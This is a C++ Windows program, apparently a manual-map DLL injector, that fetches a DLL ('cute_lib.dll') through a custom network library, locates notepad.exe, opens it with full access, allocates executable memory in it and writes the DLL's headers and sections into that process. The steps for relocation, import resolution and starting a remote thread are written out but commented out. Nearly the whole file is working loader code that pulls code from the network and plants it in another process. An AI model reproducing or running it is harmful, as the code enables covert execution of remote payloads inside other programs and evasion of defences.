//cl /EHsc .\manual.cpp /link user32.lib /OUT:manual.exe
#include <windows.h>
#include <iostream>
#include <vector>
#include <tlhelp32.h>

LPCSTR dllPath_n = "network_lib.dll";

typedef int (*SendDataFunc)(const std::string&, const std::string&);
typedef std::string (*RecvDataFunc)(const std::string&);
typedef std::vector<unsigned char> (*RecvDataRawFunc)(const std::string&);

SendDataFunc send_data;
RecvDataFunc receive_data;
RecvDataRawFunc receive_data_raw;

DWORD GetProcessID(const wchar_t* processName)
{
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(pe);
        if (Process32FirstW(hSnapshot, &pe))
        {
            do
            {
                if (_wcsicmp(pe.szExeFile, processName) == 0)
                {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

void* FindExportAddress(HMODULE hModule, const char* funcName)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);

    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
    {
        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
        if (strcmp(funcNameFromExport, funcName) == 0)
        {
            DWORD funcRVA = funcRVAs[ordRVAs[i]];
            return (void*)((BYTE*)hModule + funcRVA);

        }
    }
    std::string errorMsg = "Failed to find export address for function: ";
    errorMsg += funcName;
    MessageBoxA(NULL, errorMsg.c_str(), "Error", MB_OK);
    return nullptr;
}

void load_dll()                                             
{
    HMODULE N_dll = LoadLibraryA("network_lib.dll");
    if (N_dll == nullptr) std::cerr << "Failed to load DLL: " << GetLastError() << std::endl;

    receive_data_raw = (RecvDataRawFunc)FindExportAddress(N_dll, "?receive_data_raw@@YA?AV?$vector@EV?$allocator@E@std@@@std@@AEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@@Z");
    send_data = (SendDataFunc)FindExportAddress(N_dll, "?send_data@@YAHAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z");    
    receive_data = (RecvDataFunc)FindExportAddress(N_dll, "?receive_data@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBV12@@Z");

}

bool InjectDLL(DWORD pid, std::vector <unsigned char> *downloaded_dll)
{

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
    {
        std::cerr << "Failed to open process: " << GetLastError() << std::endl;
        return false;
    }


    BYTE* localDLL = downloaded_dll->data();
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)localDLL;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(localDLL + dosHeader->e_lfanew);

    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    
    for(int i=0;i<50;i++)std::cout << "="; std::cout << "\n\n";

    std::cout << " Size of the Image           : " << imageSize << std::endl;
    std::cout << " Image Base                  : 0x" << std::hex << ntHeaders->OptionalHeader.ImageBase << std::dec << std::endl;
    std::cout << " Entry Point                 : 0x" << std::hex << ntHeaders->OptionalHeader.AddressOfEntryPoint << std::dec << std::endl;
    std::cout << " Number of Sections          : " << ntHeaders->FileHeader.NumberOfSections << std::endl;
    std::cout << " Size of Headers             : " << ntHeaders->OptionalHeader.SizeOfHeaders << std::endl;
    std::cout << " Checksum                    : 0x" << std::hex << ntHeaders->OptionalHeader.CheckSum << std::dec << std::endl;
    std::cout << " Subsystem                   : " << ntHeaders->OptionalHeader.Subsystem << std::endl;
    std::cout << " DLL Characteristics         : 0x" << std::hex << ntHeaders->OptionalHeader.DllCharacteristics << std::dec << std::endl;
    std::cout << " Size of Stack Reserve       : " << ntHeaders->OptionalHeader.SizeOfStackReserve << std::endl;
    std::cout << " Size of Stack Commit        : " << ntHeaders->OptionalHeader.SizeOfStackCommit << std::endl;
    std::cout << " Size of Heap Reserve        : " << ntHeaders->OptionalHeader.SizeOfHeapReserve << std::endl;
    std::cout << " Size of Heap Commit         : " << ntHeaders->OptionalHeader.SizeOfHeapCommit << std::endl;
    std::cout << " Loader Flags                : 0x" << std::hex << ntHeaders->OptionalHeader.LoaderFlags << std::dec << std::endl;
    std::cout << " Number of Rva and Sizes     : " << ntHeaders->OptionalHeader.NumberOfRvaAndSizes << std::endl;
    
    std::cout << std::endl; for(int i=0;i<50;i++)std::cout << "="; std::cout << "\n\n";

//======================================================================================================================================================================

// Allocate memory for full DLL image
    std::cout << "-> Trying to allocate prefered spot ";
    void* remoteMem = VirtualAllocEx(hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem)
    {
        remoteMem = VirtualAllocEx(hProcess, nullptr, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); std::cout << "\t[FAIL]\n-> Trying random spot " << std::endl;
        if (!remoteMem)
        {
            std::cerr << "## Failed to allocate memory in target process: " << GetLastError() << std::endl;
            return false;
        }
    }   std::cout << "\t[allocated memory at: 0x" << std::hex << remoteMem << "]\n" << std::endl;

//======================================================================================================================================================================

// Write headers
    std::cout << "-> Trying to write headers " << std::endl;
    if (!WriteProcessMemory(hProcess, remoteMem, localDLL, ntHeaders->OptionalHeader.SizeOfHeaders, nullptr))
    {
        std::cerr << "Failed to write headers: " << GetLastError() << std::endl;
        return false;
    }   std::cout << "\t[wrote headers]\n" << std::endl;

//======================================================================================================================================================================

    // Write sections
    IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    {
        void* sectionDest = (BYTE*)remoteMem + sectionHeader[i].VirtualAddress;
        void* sectionSrc = localDLL + sectionHeader[i].PointerToRawData;

        if (!WriteProcessMemory(hProcess, sectionDest, sectionSrc, sectionHeader[i].SizeOfRawData, nullptr))
        {
            std::cerr << "Failed to write section " << sectionHeader[i].Name << ": " << GetLastError() << std::endl;
            return false;
        }
        std::cout << "-> Allocated Section : " << sectionHeader[i].Name << std::endl;
    }   std::cout << "\t[Allocation Done]\n" << std::endl;

//======================================================================================================================================================================

    // Resolve relocations if the base address has changed
    // if ((LPVOID)ntHeaders->OptionalHeader.ImageBase != remoteMem)
    // {
    //     std::cout << "Base Change -> \nExpected: 0x"<< std::hex << ntHeaders->OptionalHeader.ImageBase << " Actual: 0x"<< std::hex << remoteMem << std::endl; 

    //     IMAGE_DATA_DIRECTORY relocDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    //     if (relocDir.Size)
    //     {
    //         IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(localDLL + relocDir.VirtualAddress);
    //         std::cout << reloc;
    //         SIZE_T delta = (SIZE_T)remoteMem - ntHeaders->OptionalHeader.ImageBase;

    //         while (reloc->VirtualAddress)
    //         {
    //             int numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
    //             WORD* entry = (WORD*)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION));

    //             for (int i = 0; i < numEntries; i++)
    //             {
    //                 if (entry[i] >> 12 == IMAGE_REL_BASED_HIGHLOW)
    //                 {
    //                     DWORD* patchAddr = (DWORD*)((BYTE*)remoteMem + reloc->VirtualAddress + (entry[i] & 0xFFF));
    //                     DWORD oldValue;
    //                     ReadProcessMemory(hProcess, patchAddr, &oldValue, sizeof(DWORD), nullptr);
    //                     DWORD newValue = oldValue + delta;
    //                     WriteProcessMemory(hProcess, patchAddr, &newValue, sizeof(DWORD), nullptr);
    //                 }
    //             }
    //             reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
    //         }
    //     }
    // }

    // // Resolve imports
    // IMAGE_DATA_DIRECTORY importDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    // if (importDir.Size)
    // {
    //     IMAGE_IMPORT_DESCRIPTOR* importDesc = (IMAGE_IMPORT_DESCRIPTOR*)(localDLL + importDir.VirtualAddress);
    //     while (importDesc->Name)
    //     {
    //         char* moduleName = (char*)(localDLL + importDesc->Name);
    //         HMODULE hModule = LoadLibraryA(moduleName);
    //         if (!hModule)
    //         {
    //             std::cerr << "Failed to load module: " << moduleName << std::endl;
    //             return false;
    //         }

    //         IMAGE_THUNK_DATA* originalFirstThunk = (IMAGE_THUNK_DATA*)(localDLL + importDesc->OriginalFirstThunk);
    //         IMAGE_THUNK_DATA* firstThunk = (IMAGE_THUNK_DATA*)((BYTE*)remoteMem + importDesc->FirstThunk);

    //         while (originalFirstThunk->u1.AddressOfData)
    //         {
    //             if (originalFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
    //             {
    //                 void* funcAddr = GetProcAddress(hModule, (LPCSTR)(originalFirstThunk->u1.Ordinal & 0xFFFF));
    //                 WriteProcessMemory(hProcess, &firstThunk->u1.Function, &funcAddr, sizeof(void*), nullptr);
    //             }
    //             else
    //             {
    //                 IMAGE_IMPORT_BY_NAME* importByName = (IMAGE_IMPORT_BY_NAME*)(localDLL + originalFirstThunk->u1.AddressOfData);
    //                 void* funcAddr = GetProcAddress(hModule, importByName->Name);
    //                 WriteProcessMemory(hProcess, &firstThunk->u1.Function, &funcAddr, sizeof(void*), nullptr);
    //             }

    //             originalFirstThunk++;
    //             firstThunk++;
    //         }
    //         importDesc++;
    //     }
    // }

    // // Set memory protection for sections
    // for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
    // {
    //     DWORD oldProtect;
    //     void* sectionAddr = (BYTE*)remoteMem + sectionHeader[i].VirtualAddress;
    //     DWORD newProtect = PAGE_READONLY;

    //     if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
    //         newProtect = PAGE_EXECUTE_READ;
    //     else if (sectionHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
    //         newProtect = PAGE_READWRITE;

    //     VirtualProtectEx(hProcess, sectionAddr, sectionHeader[i].Misc.VirtualSize, newProtect, &oldProtect);
    // }

    // // Call the entry point
    // void* entryPoint = (BYTE*)remoteMem + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    // HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)entryPoint, remoteMem, 0, nullptr);
    // if (!hThread)
    // {
    //     std::cerr << "Failed to create remote thread: " << GetLastError() << std::endl;
    //     return false;
    // }
    // CloseHandle(hThread);
    // CloseHandle(hProcess);

    return true;

}

int main()
{
    load_dll();
 
    std::vector <unsigned char> downloaded_dll = receive_data_raw("cute_lib.dll");

    std::cout << "Trying to get a handle to the process...\n"; 
    DWORD processID = GetProcessID(L"notepad.exe");
    if (processID == 0)
    {
        std::cerr << "[-] Target process not found.\n";
        return 1;
    } std::cout << "Process ID: " << processID << "\n";

    try
    {
        if (InjectDLL(processID, &downloaded_dll)) std::cout << "\n[+] DLL successfully injected!\n";
        else std::cerr << "[-] DLL injection failed.\n";
    }
    catch(const std::exception& e)
    {
        std::cerr << e.what() << '\n';
    }

    return 0;
}